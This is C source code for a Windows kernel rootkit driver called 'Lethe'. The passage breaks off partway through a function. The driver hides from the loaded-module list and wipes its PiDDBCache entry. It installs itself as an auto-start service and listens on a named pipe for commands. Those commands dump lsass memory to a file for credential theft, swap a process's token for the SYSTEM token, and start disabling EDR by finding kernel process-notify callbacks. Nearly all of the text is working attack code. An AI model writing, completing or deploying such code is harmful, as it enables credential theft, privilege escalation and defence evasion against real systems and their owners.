#include <ntifs.h>
#include <ntstrsafe.h>
#include <ntimage.h>
#include "lethe.h"

//Memory state flags from Win32, available in kernel
#ifndef MEM_COMMIT
#define MEM_COMMIT     0x1000
#endif
#ifndef PAGE_NOACCESS
#define PAGE_NOACCESS  0x01
#endif
#ifndef PAGE_GUARD
#define PAGE_GUARD     0x100
#endif

#ifndef SystemProcessInformation
#define SystemProcessInformation 5
#endif

#define LETHE_TAG      'htL'
#define LETHE_INTERVAL 5000LL   //ms

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG          Flags;
    USHORT         LoadCount;
    USHORT         TlsIndex;
    LIST_ENTRY     HashLinks;
    PVOID          SectionPointer;
    ULONG          CheckSum;
    ULONG          TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _LETHE_CTX {
    KTIMER         Timer;
    KDPC           Dpc;
    PIO_WORKITEM   WorkItem;
    PDEVICE_OBJECT DevObj;
    BOOLEAN        Running;
    HANDLE         PipeHandle;
    BOOLEAN        Persisted;
    KEVENT         WorkerDone;
} LETHE_CTX;

typedef struct _PIDDB_CACHE_ENTRY {
    LIST_ENTRY      List;
    UNICODE_STRING  DriverName;
    ULONG           TimeDateStamp;
    NTSTATUS        LoadStatus;
    char            _0x20[16];
} PIDDB_CACHE_ENTRY, *PPIDDB_CACHE_ENTRY;

static LETHE_CTX g_Ctx;

DRIVER_UNLOAD       LetheUnload;
KDEFERRED_ROUTINE   LetheDpc;
IO_WORKITEM_ROUTINE LetheWorker;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    LARGE_INTEGER  WorkingSetPrivateSize;
    ULONG          HardFaultCount;
    ULONG          NumberOfThreadsHighWatermark;
    ULONGLONG      CycleTime;
    LARGE_INTEGER  CreateTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  KernelTime;
    UNICODE_STRING ImageName;
    LONG           BasePriority;
    HANDLE         UniqueProcessId;
    HANDLE         InheritedFromUniqueProcessId;
    ULONG          HandleCount;
    ULONG          SessionId;
    ULONG_PTR      UniqueProcessKey;
    SIZE_T         PeakVirtualSize;
    SIZE_T         VirtualSize;
    ULONG          PageFaultCount;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    SIZE_T         QuotaPeakPagedPoolUsage;
    SIZE_T         QuotaPagedPoolUsage;
    SIZE_T         QuotaPeakNonPagedPoolUsage;
    SIZE_T         QuotaNonPagedPoolUsage;
    SIZE_T         PagefileUsage;
    SIZE_T         PeakPagefileUsage;
    SIZE_T         PrivatePageCount;
    LARGE_INTEGER  ReadOperationCount;
    LARGE_INTEGER  WriteOperationCount;
    LARGE_INTEGER  OtherOperationCount;
    LARGE_INTEGER  ReadTransferCount;
    LARGE_INTEGER  WriteTransferCount;
    LARGE_INTEGER  OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

// RtlFindUnicodeSubstring is undocumented; declare it manually
BOOLEAN NTAPI RtlFindUnicodeSubstring(
    _In_ PUNICODE_STRING String,
    _In_ PUNICODE_STRING Substring,
    _In_ BOOLEAN         CaseInSensitive
);

PVOID NTAPI RtlPcToFileHeader(
    _In_  PVOID  PcValue,
    _Out_ PVOID* BaseOfImage);

//Fucntions prototypes
PLDR_DATA_TABLE_ENTRY LetheGetLdrEntry(PDRIVER_OBJECT DriverObject);
VOID LetheHideFromModuleList(PDRIVER_OBJECT DriverObject);
VOID LetheClearPiDDBCache(PDRIVER_OBJECT DriverObject);
ULONG LetheGetTimestamp(PDRIVER_OBJECT DriverObject);
PVOID LetheGetNtoskrnlBase(VOID);
PUCHAR LetheScanPattern(PUCHAR Base, SIZE_T Size, PUCHAR Pattern, SIZE_T PatternSize);
VOID LetheInstallPersistence(VOID);
NTSTATUS LetheSendResult(HANDLE PipeHandle, const char* Message);
PRTL_AVL_TABLE LetheFindPiDDBCacheTable(PVOID NtBase, SIZE_T NtSize);
PEPROCESS LetheFindProcess(const char* TargetName);
NTSTATUS  LetheCredDump(HANDLE PipeHandle);
NTSTATUS LetheTokenSteal(HANDLE PipeHandle, ULONG TargetPid);
PUCHAR NTAPI PsGetProcessImageFileName(PEPROCESS Process);
PEPROCESS NTAPI PsGetNextProcess(PEPROCESS Process);
NTSTATUS NTAPI ZwQuerySystemInformation( ULONG  SystemInformationClass, PVOID  SystemInformation, ULONG  SystemInformationLength, PULONG ReturnLength);
NTSTATUS NTAPI MmCopyVirtualMemory(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess, PVOID TargetAddress, SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);
BOOLEAN LetheUnicodeContains(PUNICODE_STRING Haystack, PUNICODE_STRING Needle);
PVOID LetheFindCallbackArray(PVOID NtBase, SIZE_T NtSize);
BOOLEAN LetheCallbackBelongsToTarget(PVOID CallbackAddress, PUNICODE_STRING TargetName);
NTSTATUS LetheKillEDR(HANDLE PipeHandle, PWCHAR TargetName);

//driver entry (main fof the driver)
NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{

    RtlZeroMemory(&g_Ctx, sizeof(g_Ctx));
    KeInitializeEvent(&g_Ctx.WorkerDone, NotificationEvent, FALSE); //unload BSOD prevent. 2nd BSOD while developing Lethe
    
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS       status;
    UNICODE_STRING devName =
        RTL_CONSTANT_STRING(L"\\Device\\Lethe");

    DbgPrint("[Lethe] DriverEntry\n");

    status = IoCreateDevice(DriverObject, 0, &devName,
                            FILE_DEVICE_UNKNOWN,
                            FILE_DEVICE_SECURE_OPEN,
                            FALSE, &g_Ctx.DevObj);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Lethe] IoCreateDevice failed: 0x%X\n", status);
        return status;
    }

    g_Ctx.Running  = TRUE;
    g_Ctx.WorkItem = IoAllocateWorkItem(g_Ctx.DevObj);
    if (!g_Ctx.WorkItem) {
        IoDeleteDevice(g_Ctx.DevObj);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    KeInitializeDpc(&g_Ctx.Dpc, LetheDpc, &g_Ctx);
    KeInitializeTimerEx(&g_Ctx.Timer, SynchronizationTimer);

    LARGE_INTEGER due;
    due.QuadPart = -(LETHE_INTERVAL * 10000LL);
    KeSetTimerEx(&g_Ctx.Timer, due, 0, &g_Ctx.Dpc);

    DriverObject->DriverUnload = LetheUnload;

    DbgPrint("[Lethe] Armed. Firing every %lldms\n", LETHE_INTERVAL);
    
    // Hide after everything is initialized
    LetheHideFromModuleList(DriverObject);
    LetheClearPiDDBCache(DriverObject);
    LetheInstallPersistence();

    DbgPrint("[Lethe] Hidden\n");
    return STATUS_SUCCESS;
}

//DPC fire
VOID LetheDpc(
    _In_     PKDPC Dpc,
    _In_opt_ PVOID Context,
    _In_opt_ PVOID Arg1,
    _In_opt_ PVOID Arg2) {
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(Arg1);
    UNREFERENCED_PARAMETER(Arg2);

    LETHE_CTX* ctx = (LETHE_CTX*)Context;
    if (!ctx || !ctx->Running) return;

    DbgPrint("[Lethe] DPC fired\n");

    IoQueueWorkItem(ctx->WorkItem, LetheWorker,
                    DelayedWorkQueue, ctx);

    //re-arm
    LARGE_INTEGER due;
    due.QuadPart = -(LETHE_INTERVAL * 10000LL);
    KeSetTimerEx(&ctx->Timer, due, 0, &ctx->Dpc);
}

//pipe
NTSTATUS LetheOpenPipe(HANDLE* OutHandle) {
    UNICODE_STRING pipeName;
    RtlInitUnicodeString(&pipeName, L"\\Device\\NamedPipe\\lethe");

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &pipeName,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL, NULL);

    IO_STATUS_BLOCK iosb = { 0 };

    //GENERIC_READ | GENERIC_WRITE
    //Both sides can read and write
    NTSTATUS status = ZwCreateFile(
        OutHandle,
        GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    if (!NT_SUCCESS(status))
        DbgPrint("[Lethe] Pipe open failed: 0x%X\n", status);
    else
        DbgPrint("[Lethe] Pipe opened (duplex)\n");

    return status;
}

NTSTATUS LetheWrite(HANDLE PipeHandle, const char* Message) {
    SIZE_T len = 0;
    RtlStringCbLengthA(Message, 512, &len);
    IO_STATUS_BLOCK iosb = { 0 };

    NTSTATUS status = ZwWriteFile(
        PipeHandle,
        NULL,
        NULL,
        NULL,
        &iosb,
        (PVOID)Message,
        (ULONG)len,
        NULL,
        NULL);

    if(!NT_SUCCESS(status))
        DbgPrint("[Lethe] Write failed: 0x%X\n", status);

    return status;
}

NTSTATUS LetheRead(HANDLE PipeHandle, PVOID  Buffer, ULONG  BufferSize, PULONG BytesRead) {
    IO_STATUS_BLOCK iosb = { 0 };

    NTSTATUS status = ZwReadFile(
        PipeHandle,
        NULL,       // no event
        NULL,       // no APC
        NULL,       // no APC context
        &iosb,
        Buffer,
        BufferSize,
        NULL,       // byte offset — NULL for pipes
        NULL);      // key

    if (NT_SUCCESS(status))
        *BytesRead = (ULONG)iosb.Information;
    else
        DbgPrint("[Lethe] Read failed: 0x%X\n", status);

    return status;
}

//Worker
VOID LetheWorker(
    _In_     PDEVICE_OBJECT DevObj,
    _In_opt_ PVOID          Context) 
{
    UNREFERENCED_PARAMETER(DevObj);

    LETHE_CTX* ctx = (LETHE_CTX*)Context;
    if (!ctx || !ctx->Running) goto done;

    if (!ctx->PipeHandle) {
        NTSTATUS s = LetheOpenPipe(&ctx->PipeHandle);
        if (!NT_SUCCESS(s)) {
            DbgPrint("[Lethe] Waiting for client...\n");
            goto done;
        }
    }

    LETHE_MSG_HEADER header = { 0 };
    ULONG bytesRead = 0;

    NTSTATUS status = LetheRead(
        ctx->PipeHandle,
        &header,
        sizeof(header),
        &bytesRead);

    if (status == STATUS_PIPE_BROKEN || status == STATUS_PIPE_DISCONNECTED) {
        DbgPrint("[Lethe] Client disconnected\n");
        ZwClose(ctx->PipeHandle);
        ctx->PipeHandle = NULL;
        goto done;        //goto instead of return
    }

    if (!NT_SUCCESS(status) || bytesRead < sizeof(header))
        goto done;

    DbgPrint("[Lethe] Command: 0x%X, Length: %d\n", header.Command, header.PayloadLength);

    switch (header.Command) {

    case LETHE_CMD_PING:
        LetheSendResult(ctx->PipeHandle, "Lethe alive: kernel DPC engine");
        DbgPrint("[Lethe] Ping handled\n");
        break;

    case LETHE_CMD_CREDDUMP:
        DbgPrint("[Lethe] CredDump command\n");
        LetheCredDump(ctx->PipeHandle);
        break;

    case LETHE_CMD_TOKENSTEAL: {
        DbgPrint("[Lethe] TokenSteal command\n");

        if (header.PayloadLength < sizeof(LETHE_TOKEN_PAYLOAD)) {
        LetheSendResult(ctx->PipeHandle, "Error: bad payload");
        break;
    }

        LETHE_TOKEN_PAYLOAD payload = { 0 };
        ULONG payloadRead = 0;
        LetheRead(ctx->PipeHandle, &payload, sizeof(payload), &payloadRead);

        LetheTokenSteal(ctx->PipeHandle, payload.TargetPid);
        break;
    }

    case LETHE_CMD_KILLEDR: {
        DbgPrint("[Lethe] KillEDR command\n");

        if (header.PayloadLength < sizeof(LETHE_EDR_PAYLOAD)) {
        LetheSendResult(ctx->PipeHandle, "Error: bad payload");
        break;
    }

        LETHE_EDR_PAYLOAD payload = { 0 };
        ULONG payloadRead = 0;
        LetheRead(ctx->PipeHandle, &payload, sizeof(payload), &payloadRead);

        LetheKillEDR(ctx->PipeHandle, payload.ProcessName);
    break;
}

    default:
        DbgPrint("[Lethe] Unknown command: 0x%X\n", header.Command);
        break;
    }

    done:
    if (!g_Ctx.Running)
        KeSetEvent(&g_Ctx.WorkerDone, 0, FALSE);
}

//Unload
VOID LetheUnload(_In_ PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);

    DbgPrint("[Lethe] Unloading\n");

    g_Ctx.Running = FALSE;

    KeCancelTimer(&g_Ctx.Timer);

    KeFlushQueuedDpcs();

    if (g_Ctx.PipeHandle) {
        ZwClose(g_Ctx.PipeHandle);
        g_Ctx.PipeHandle = NULL;
    }

    LARGE_INTEGER timeout;
    timeout.QuadPart = -(5000LL * 10000LL);
    KeWaitForSingleObject(&g_Ctx.WorkerDone, Executive, KernelMode, FALSE, &timeout);

    if (g_Ctx.WorkItem) {
        IoFreeWorkItem(g_Ctx.WorkItem);
        g_Ctx.WorkItem = NULL;
    }

    if (g_Ctx.DevObj) {
        IoDeleteDevice(g_Ctx.DevObj);
        g_Ctx.DevObj = NULL;
    }

    DbgPrint("[Lethe] Gone\n");
}

PLDR_DATA_TABLE_ENTRY LetheGetLdrEntry(PDRIVER_OBJECT DriverObject) {
    return (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
}

VOID LetheHideFromModuleList(PDRIVER_OBJECT DriverObject) {
    PLDR_DATA_TABLE_ENTRY entry = LetheGetLdrEntry(DriverObject);
    if(!entry) return;

    RemoveEntryList(&entry->InLoadOrderLinks);
    entry->InLoadOrderLinks.Flink = &entry->InLoadOrderLinks;
    entry->InLoadOrderLinks.Blink = &entry->InLoadOrderLinks;

    DbgPrint("[Lethe] Unlinked from PsLoadedModuleList\n");
}

ULONG LetheGetTimestamp(PDRIVER_OBJECT DriverObject) {

    PLDR_DATA_TABLE_ENTRY ldr = LetheGetLdrEntry(DriverObject);
    if (!ldr) return 0;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ldr->DllBase;
    if (!dos || dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    // e_lfanew = offset to PE header from base
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)
        ((PUCHAR)ldr->DllBase + dos->e_lfanew);

    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    //Got 1st BSOD here.
    ULONG ts = nt->FileHeader.TimeDateStamp;
    DbgPrint("[Lethe] Our timestamp: 0x%X\n", ts);
    return ts;
}

PVOID LetheGetNtoskrnlBase(VOID) {

    PVOID moduleBase = NULL;
    PVOID result = RtlPcToFileHeader(
        (PVOID)ExAllocatePoolWithTag,
        &moduleBase);

    if (!result || !moduleBase) {
        DbgPrint("[Lethe] RtlPcToFileHeader failed\n");
        return NULL;
    }

    DbgPrint("[Lethe] ntoskrnl base: %p\n", moduleBase);
    return moduleBase;
}

PUCHAR LetheScanPattern(
    PUCHAR Base,
    SIZE_T Size,
    PUCHAR Pattern,
    SIZE_T PatternSize)
{
    if (!Base || !Pattern || PatternSize == 0) return NULL;

    PUCHAR result = NULL;

    __try {
        for (SIZE_T i = 0; i < Size - PatternSize; i++) {
            BOOLEAN found = TRUE;

            for (SIZE_T j = 0; j < PatternSize; j++) {
                if (Pattern[j] != 0xCC &&
                    Base[i + j] != Pattern[j]) {
                    found = FALSE;
                    break;
                }
            }

            if (found) {
                result = Base + i;
                break;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[Lethe] Pattern scan exception at offset\n");
        result = NULL;
    }

    return result;
}

PRTL_AVL_TABLE LetheFindPiDDBCacheTable(PVOID NtBase, SIZE_T NtSize) {

    UCHAR pattern[] = {
        0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0xCC,  // lea rcx,[PiDDBCacheTable]
        0x48, 0x8D, 0x15, 0xCC, 0xCC, 0xCC, 0xCC   // lea rdx,[PiDDBLock]
    };

    PUCHAR match = LetheScanPattern(
        (PUCHAR)NtBase,
        NtSize,
        pattern,
        sizeof(pattern));

    if (!match) {
        DbgPrint("[Lethe] Pattern not found\n");
        return NULL;
    }

    LONG   offset = *(PLONG)(match + 3);
    PVOID  table  = (PVOID)(match + 7 + offset);

    if ((ULONG_PTR)table < 0xFFFF000000000000ULL) {
        DbgPrint("[Lethe] Decoded pointer not in kernel space: %p\n", table);
        return NULL;
    }

    if ((PUCHAR)table < (PUCHAR)NtBase || (PUCHAR)table > (PUCHAR)NtBase + NtSize) {
        DbgPrint("[Lethe] Decoded pointer outside ntoskrnl: %p\n", table);
        return NULL;
    }

    DbgPrint("[Lethe] PiDDBCacheTable: %p\n", table);
    return (PRTL_AVL_TABLE)table;
}

VOID LetheClearPiDDBCache(PDRIVER_OBJECT DriverObject) {
    ULONG ts = LetheGetTimestamp(DriverObject);
    if (!ts) {
        DbgPrint("[Lethe] Timestamp = 0, skipping\n");
        return;
    }

    PVOID ntBase = LetheGetNtoskrnlBase();
    if (!ntBase) return;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)
        ((PUCHAR)ntBase + ((PIMAGE_DOS_HEADER)ntBase)->e_lfanew);
    SIZE_T ntSize = nt->OptionalHeader.SizeOfImage;

    PRTL_AVL_TABLE table = LetheFindPiDDBCacheTable(ntBase, ntSize);

    // NULL check: if pattern failed, skip safely Don't BSOD just because we couldn't find the table
    if (!table) {
        DbgPrint("[Lethe] Table not found — skipping PiDDBCache clear\n");
        return;
    }

    __try {
        PPIDDB_CACHE_ENTRY entry = NULL;
        BOOLEAN restart = TRUE;

        while ((entry = (PPIDDB_CACHE_ENTRY)
                RtlEnumerateGenericTableAvl(table, restart)) != NULL)
        {
            restart = FALSE;

            if (entry->TimeDateStamp == ts) {
                DbgPrint("[Lethe] Found entry — ts: 0x%X\n", ts);

                RemoveEntryList(&entry->List);

                RtlDeleteElementGenericTableAvl(table, entry);

                DbgPrint("[Lethe] PiDDBCache cleared\n");
                return;
            }
        }

        DbgPrint("[Lethe] Entry not found in PiDDBCache\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[Lethe] Exception in PiDDBCache clear: 0x%X\n",
                 GetExceptionCode());
    }
}

VOID LetheInstallPersistence(VOID) {
    NTSTATUS          status;
    HANDLE            hKey = NULL;
    UNICODE_STRING    keyPath;
    OBJECT_ATTRIBUTES oa;

    // Registry key path: same path sc.exe would create
    RtlInitUnicodeString(&keyPath,
        L"\\Registry\\Machine\\SYSTEM\\"
        L"CurrentControlSet\\Services\\Lethe");

    InitializeObjectAttributes(&oa, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    // ZwCreateKey creates key if not exists, opens if exists
    status = ZwCreateKey(&hKey, KEY_ALL_ACCESS, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[Lethe] Registry key create failed: 0x%X\n", status);
        return;
    }

    #define WRITE_DWORD(name, val) \
    { \
        UNICODE_STRING vn; \
        RtlInitUnicodeString(&vn, name); \
        ULONG data = (val); \
        ZwSetValueKey(hKey, &vn, 0, REG_DWORD, &data, sizeof(ULONG)); \
    }

    #define WRITE_SZ(name, val) \
    { \
        UNICODE_STRING vn; \
        RtlInitUnicodeString(&vn, name); \
        UNICODE_STRING data; \
        RtlInitUnicodeString(&data, val); \
        ZwSetValueKey(hKey, &vn, 0, REG_SZ, \
                      data.Buffer, data.Length + sizeof(WCHAR)); \
    }

    // Maps to Win32 path C:\Lethe\lethe.sys
    WRITE_SZ(L"ImagePath",    L"\\??\\C:\\Lethe\\lethe.sys");
    WRITE_DWORD(L"Type",         1);   // SERVICE_KERNEL_DRIVER
    WRITE_DWORD(L"Start",        2);   // SERVICE_AUTO_START
    WRITE_DWORD(L"ErrorControl", 1);   // SERVICE_ERROR_NORMAL

    ZwClose(hKey);

    DbgPrint("[Lethe] Persistence installed\n");

    #undef WRITE_DWORD
    #undef WRITE_SZ
}

NTSTATUS LetheSendResult(HANDLE PipeHandle, const char* Message) {
    SIZE_T msgLen = 0;
    RtlStringCbLengthA(Message, 512, &msgLen);

    ULONG len32 = (ULONG)msgLen;
    IO_STATUS_BLOCK iosb = { 0 };

    NTSTATUS status = ZwWriteFile(
        PipeHandle, NULL, NULL, NULL,
        &iosb, &len32, sizeof(ULONG),
        NULL, NULL);

    if (!NT_SUCCESS(status)) return status;

    //send the actual message
    status = ZwWriteFile(
        PipeHandle, NULL, NULL, NULL,
        &iosb, (PVOID)Message, (ULONG)msgLen,
        NULL, NULL);

    return status;
}

PEPROCESS LetheFindProcess(const char* TargetName) {
    ULONG    bufSize = 1024 * 1024;
    PVOID    buf     = ExAllocatePoolWithTag(
                           NonPagedPool, bufSize, LETHE_TAG);
    if (!buf) return NULL;

    ULONG    retLen  = 0;
    NTSTATUS status  = ZwQuerySystemInformation(
        SystemProcessInformation, buf, bufSize, &retLen);

    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(buf, LETHE_TAG);
        return NULL;
    }

    PEPROCESS                 found = NULL;
    PSYSTEM_PROCESS_INFORMATION info =
        (PSYSTEM_PROCESS_INFORMATION)buf;

    while (TRUE) {
        if (info->ImageName.Buffer) {
            ANSI_STRING    ansi;
            UNICODE_STRING uTarget = { 0 };
            RtlInitAnsiString(&ansi, TargetName);

            if (NT_SUCCESS(RtlAnsiStringToUnicodeString(
                    &uTarget, &ansi, TRUE))) {
                if (RtlEqualUnicodeString(
                        &info->ImageName, &uTarget, TRUE)) {
                    PsLookupProcessByProcessId(
                        (HANDLE)info->UniqueProcessId, &found);
                    RtlFreeUnicodeString(&uTarget);
                    break;
                }
                RtlFreeUnicodeString(&uTarget);
            }
        }

        if (!info->NextEntryOffset) break;
        info = (PSYSTEM_PROCESS_INFORMATION)
            ((PUCHAR)info + info->NextEntryOffset);
    }

    ExFreePoolWithTag(buf, LETHE_TAG);
    return found;
}

NTSTATUS LetheCredDump(HANDLE PipeHandle) {
    NTSTATUS  status;
    PEPROCESS lsass = NULL;

    DbgPrint("[Lethe] CredDump starting\n");

    lsass = LetheFindProcess("lsass.exe");
    if (!lsass) {
        DbgPrint("[Lethe] lsass not found\n");
        LetheSendResult(PipeHandle, "Error: lsass not found");
        return STATUS_NOT_FOUND;
    }

    DbgPrint("[Lethe] lsass EPROCESS: %p\n", lsass);

    #define CHUNK_SIZE (4 * 1024 * 1024)   //4MB

    PVOID chunkBuf = ExAllocatePoolWithTag(
        NonPagedPool, CHUNK_SIZE, LETHE_TAG);

    if (!chunkBuf) {
        ObDereferenceObject(lsass);
        LetheSendResult(PipeHandle, "Error: alloc failed");
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    UNICODE_STRING    dumpPath;
    OBJECT_ATTRIBUTES dumpOa;
    IO_STATUS_BLOCK   dumpIosb = { 0 };
    HANDLE            dumpFile  = NULL;

    RtlInitUnicodeString(&dumpPath, L"\\??\\C:\\Windows\\Temp\\lsass.dmp");

    InitializeObjectAttributes(&dumpOa, &dumpPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwCreateFile(
        &dumpFile,
        GENERIC_WRITE | SYNCHRONIZE,
        &dumpOa, &dumpIosb, NULL,
        FILE_ATTRIBUTE_NORMAL, 0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[Lethe] File create failed: 0x%X\n", status);
        ExFreePoolWithTag(chunkBuf, LETHE_TAG);
        ObDereferenceObject(lsass);
        LetheSendResult(PipeHandle, "Error: file create failed");
        return status;
    }

    PVOID  address    = NULL;
    SIZE_T totalBytes = 0;
    ULONG  chunks     = 0;

    while (TRUE) {
        MEMORY_BASIC_INFORMATION mbi = { 0 };
        SIZE_T returnLen = 0;

        KAPC_STATE apc;
        KeStackAttachProcess((PRKPROCESS)lsass, &apc);

        status = ZwQueryVirtualMemory(
            ZwCurrentProcess(),
            address,
            MemoryBasicInformation,
            &mbi,
            sizeof(mbi),
            &returnLen);

        KeUnstackDetachProcess(&apc);

        if (!NT_SUCCESS(status)) break;

        if (mbi.State   == MEM_COMMIT &&
            mbi.Protect != PAGE_NOACCESS &&
            mbi.Protect != PAGE_GUARD &&
           !(mbi.Protect & PAGE_GUARD)) {

            SIZE_T remaining = mbi.RegionSize;
            PUCHAR src       = (PUCHAR)mbi.BaseAddress;

            while (remaining > 0) {
                SIZE_T copySize = remaining < CHUNK_SIZE ?
                                  remaining : CHUNK_SIZE;
                SIZE_T copied   = 0;

                NTSTATUS copyStatus = MmCopyVirtualMemory(
                    lsass,                  // source process
                    src,                    // source address
                    PsGetCurrentProcess(),  // target = us
                    chunkBuf,              // target buffer
                    copySize,
                    KernelMode,
                    &copied);

                if (NT_SUCCESS(copyStatus) && copied > 0) {
                    // Write chunk to file
                    IO_STATUS_BLOCK wIosb = { 0 };
                    ZwWriteFile(dumpFile, NULL, NULL, NULL,
                               &wIosb, chunkBuf, (ULONG)copied,
                               NULL, NULL);
                    totalBytes += copied;
                }

                src       += copySize;
                remaining -= copySize;
            }

            chunks++;
        }

        address = (PUCHAR)mbi.BaseAddress + mbi.RegionSize;

        if ((ULONG_PTR)address >= 0x7FFFFFFFFFFF) break;
    }

    ZwClose(dumpFile);
    ExFreePoolWithTag(chunkBuf, LETHE_TAG);
    ObDereferenceObject(lsass);

    DbgPrint("[Lethe] Dump complete: %zu bytes, %d regions\n", totalBytes, chunks);

    char result[128] = { 0 };
    RtlStringCbPrintfA(result, sizeof(result), "CredDump OK: %zu bytes -> C:\\Windows\\Temp\\lsass.dmp", totalBytes);

    LetheSendResult(PipeHandle, result);
    return STATUS_SUCCESS;
}

NTSTATUS LetheTokenSteal(HANDLE PipeHandle, ULONG TargetPid) {
    NTSTATUS  status;
    PEPROCESS targetProcess = NULL;
    PEPROCESS systemProcess = NULL;

    DbgPrint("[Lethe] TokenSteal → PID %d\n", TargetPid);

    systemProcess = PsInitialSystemProcess;
    if (!systemProcess) {
        LetheSendResult(PipeHandle, "Error: PsInitialSystemProcess null");
        return STATUS_NOT_FOUND;
    }

    status = PsLookupProcessByProcessId(
        (HANDLE)(ULONG_PTR)TargetPid,
        &targetProcess);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[Lethe] PsLookupProcessByProcessId failed: 0x%X\n",
                 status);
        LetheSendResult(PipeHandle, "Error: target PID not found");
        return status;
    }

    PACCESS_TOKEN systemToken =
        PsReferencePrimaryToken(systemProcess);

    if (!systemToken) {
        ObDereferenceObject(targetProcess);
        LetheSendResult(PipeHandle, "Error: system token null");
        return STATUS_UNSUCCESSFUL;
    }

    // NOTE: Used AI for write comments and Learn some concept and for some functions. Didn't copy-pasted
    // PsGetProcessId is exported — use it to get offset
    // The token field in EPROCESS is at a known offset
    // We use the documented API rather than hardcoded offset:
    // PsGetCurrentToken / PsReferencePrimaryToken + direct write

    // Get the EX_FAST_REF value of system token
    // PsReferencePrimaryToken returns the raw token pointer
    // EPROCESS.Token is stored as EX_FAST_REF (pointer + ref count)
    // The ref count lives in the lower 4 bits
    // We mask them out when reading, preserve them when writing

    // Find Token offset by using the exported SeQueryInformationToken
    // Reliable approach: use PsGetCurrentToken on system process
    // then find and overwrite target's token field

    // Simplest reliable method — use ObReferenceObjectByHandle
    // pattern to find the EPROCESS Token offset dynamically
    // via the known SeSystemDefaultDacl pattern
    // OR — use the fixed offset for Win10 19041:

    // Token field offset in EPROCESS for Windows 10 19041:
    // Confirmed via: dt nt!_EPROCESS in WinDbg
    #define EPROCESS_TOKEN_OFFSET 0x4B8

    ULONG_PTR* targetTokenPtr =
        (ULONG_PTR*)((PUCHAR)targetProcess + EPROCESS_TOKEN_OFFSET);

    ULONG_PTR currentVal  = *targetTokenPtr;
    ULONG_PTR refBits     = currentVal & 0xF; // lower 4 bits = ref count

    ULONG_PTR newTokenVal =
        ((ULONG_PTR)systemToken & ~0xF) | refBits;

    *targetTokenPtr = newTokenVal;

    DbgPrint("[Lethe] Token swapped for PID %d\n", TargetPid);

    PsDereferencePrimaryToken(systemToken);
    ObDereferenceObject(targetProcess);

    char result[64] = { 0 };
    RtlStringCbPrintfA(result, sizeof(result),
        "TokenSteal OK: PID %d now SYSTEM", TargetPid);
    LetheSendResult(PipeHandle, result);

    return STATUS_SUCCESS;
}

BOOLEAN LetheUnicodeContains(PUNICODE_STRING Haystack, PUNICODE_STRING Needle) {
    if (!Haystack || !Needle) return FALSE;
    if (!Haystack->Buffer || !Needle->Buffer) return FALSE;
    if (Needle->Length == 0) return FALSE;
    if (Needle->Length > Haystack->Length) return FALSE;

    USHORT haystackChars = Haystack->Length / sizeof(WCHAR);
    USHORT needleChars   = Needle->Length   / sizeof(WCHAR);

    for (USHORT i = 0; i <= haystackChars - needleChars; i++) {
        BOOLEAN match = TRUE;
        for (USHORT j = 0; j < needleChars; j++) {
            WCHAR h = Haystack->Buffer[i + j];
            WCHAR n = Needle->Buffer[j];

            if (h >= L'A' && h <= L'Z') h += 32;
            if (n >= L'A' && n <= L'Z') n += 32;

            if (h != n) { match = FALSE; break; }
        }
        if (match) return TRUE;
    }
    return FALSE;
}

PVOID LetheFindCallbackArray(PVOID NtBase, SIZE_T NtSize) {
    UNICODE_STRING funcName;
    RtlInitUnicodeString(&funcName,
        L"PsSetCreateProcessNotifyRoutine");

    PUCHAR funcAddr =
        (PUCHAR)MmGetSystemRoutineAddress(&funcName);

    if (!funcAddr) {
